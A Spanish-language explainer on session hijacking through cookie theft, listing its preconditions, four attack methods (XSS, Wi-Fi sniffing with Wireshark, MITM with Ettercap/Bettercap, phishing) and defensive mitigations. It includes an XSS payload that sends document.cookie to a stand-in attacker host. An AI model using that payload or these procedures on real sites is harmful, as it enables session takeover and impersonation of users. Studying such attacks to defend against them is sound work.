## **Condiciones necesarias para un robo de sesión**

1. **Uso de cookies vulnerables:**    
   - Las cookies no deben tener protección con atributos como **HttpOnly** o **Secure**.
   - Las cookies no deben estar cifradas correctamente o deben transmitirse por HTTP en lugar de HTTPS.

2. **Conexión insegura:**
   - Las víctimas acceden al servicio por **redes públicas o no cifradas**, como Wi-Fi abiertas.

3. **Vulnerabilidades en el sitio web:**
   - El sitio podría ser vulnerable a ataques de **Cross-Site Scripting (XSS)**, permitiendo la inyección de scripts maliciosos para robar cookies.
   - Falta de **expiración adecuada de la sesión**, lo que extiende la validez de la cookie.

---

## **Procedimientos para robar cookies**

### 1. **Mediante XSS (Cross-Site Scripting)**

- **Objetivo:** Inyectar un script en la página web de la víctima para obtener su cookie.
- **Ejemplo de payload:**
   javascript
    `<script>document.location='http://atacante.com?cookie=' + document.cookie;</script>`
- El atacante envía este enlace o script embebido en un sitio o mensaje malicioso. Si el usuario lo ejecuta, su cookie se envía al servidor del atacante.

---

### 2. **Mediante sniffing en redes públicas (captura de tráfico)**

- **Requisito:** El tráfico HTTP no está cifrado (no se usa HTTPS).
- **Herramienta:** Utilizar **Wireshark** para capturar paquetes.
- **Procedimiento:**
   1. Capturar el tráfico de red de la víctima en una Wi-Fi pública.
   2. Filtrar por cookies HTTP en los paquetes.
   3. Extraer la cookie y usarla en otro navegador para suplantar al usuario.

---

### 3. **Ataques con MITM (Man-in-the-Middle)**

- **Requisito:** El atacante se coloca entre la víctima y el servidor.
- **Herramientas:**
   - **Ettercap** o **Bettercap** para realizar MITM.
- **Procedimiento:**
   1. Interceptar el tráfico entre la víctima y el servidor.
   2. Extraer cookies no cifradas.
   3. Usar la cookie para acceder al servicio como si fuera el usuario legítimo.

---

### 4. **Ingeniería social o phishing**

- El atacante engaña al usuario para que acceda a un sitio clonado o haga clic en un enlace malicioso que extrae sus cookies mediante JavaScript.

---

## **Mitigaciones**

1. **Atributos de cookies seguros:**
   - Utilizar **HttpOnly** para evitar que las cookies sean accesibles desde JavaScript.
   - Aplicar **Secure** para que solo se transmitan por HTTPS.
2. **Cifrado TLS:**
   - Asegurar que todas las comunicaciones se realicen por HTTPS.
3. **Expiración de sesión:**
   - Forzar la caducidad de las cookies tras un periodo de inactividad.
4. **Protección contra XSS:**
   - Implementar filtrado y validación de entradas para prevenir XSS.
5. **Verificación de IP o agente:**
   - Asociar la sesión con la IP o el navegador para detectar anomalías.